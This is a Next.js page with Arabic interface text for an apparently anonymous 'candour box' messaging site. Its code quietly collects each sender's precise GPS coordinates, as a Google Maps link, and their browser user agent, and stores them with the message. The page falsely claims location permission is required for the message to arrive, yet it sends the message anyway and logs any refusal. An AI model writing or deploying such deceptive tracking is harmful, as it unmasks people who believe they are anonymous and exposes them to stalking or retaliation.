'use client';
import { createClient } from '@supabase/supabase-js';
import { useState, FormEvent } from 'react';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!, 
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function Home() {
  const [message, setMessage] = useState<string>('');
  const [status, setStatus] = useState<string>('');

  const sendMessage = async (e: FormEvent) => {
    e.preventDefault();
    setStatus('جاري طلب إذن الموقع...');

    // وظيفة جلب الموقع لازم تبدأ فوراً عند الضغط
    if (!navigator.geolocation) {
      alert("متصفحك لا يدعم تحديد الموقع");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // لو وافق على الإذن
        const { latitude, longitude } = pos.coords;
        const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        
        setStatus('تم تحديد الموقع بدقة، جاري إرسال الرسالة...');
        
        const { error } = await supabase
          .from('messages')
          .insert([{ 
            content: message, 
            device: navigator.userAgent,
            location: locationLink 
          }]);

        if (error) setStatus('حدث خطأ في الإرسال');
        else {
          setStatus('تم الإرسال بنجاح بموقعك الدقيق!');
          setMessage('');
        }
      },
      async (err) => {
        // لو رفض الإذن (هنا هيبعت الرسالة برضه بس هيكتبلك إن الشخص رفض)
        setStatus('تم رفض الإذن، جاري الإرسال بدون موقع دقيق...');
        
        const { error } = await supabase
          .from('messages')
          .insert([{ 
            content: message, 
            device: navigator.userAgent,
            location: "رفض الشخص مشاركة الموقع (GPS)" 
          }]);

        if (error) setStatus('حدث خطأ');
        else {
          setStatus('تم الإرسال (بدون موقع دقيق لرفضك الإذن)');
          setMessage('');
        }
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };

  return (
    <main className="min-h-screen flex items-center justify-center bg-gray-50 p-4" dir="rtl">
      <div className="bg-white p-8 rounded-3xl shadow-xl max-w-md w-full text-center border border-gray-100">
        <h1 className="text-2xl font-bold mb-2 text-gray-800">صندوق الصراحة</h1>
        <p className="text-gray-500 mb-8 text-sm leading-relaxed">
          عشان رسالتك توصل، لازم توافق على "إذن الموقع" اللي هيظهرلك دلوقت.
        </p>
        
        <form onSubmit={sendMessage}>
          <textarea
            className="w-full p-4 border border-gray-200 rounded-2xl mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500 text-right bg-gray-50"
            rows={5}
            placeholder="اكتب رسالتك الصريحة هنا..."
            value={message}
            onChange={(e) => setMessage(e.target.value)}
            required
          />
          <button 
            type="submit" 
            className="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold hover:bg-blue-700 active:scale-95 transition-all"
          >
            إرسال الآن
          </button>
        </form>
        
        {status && <p className="mt-6 text-sm font-bold text-blue-500">{status}</p>}
      </div>
    </main>
  );
}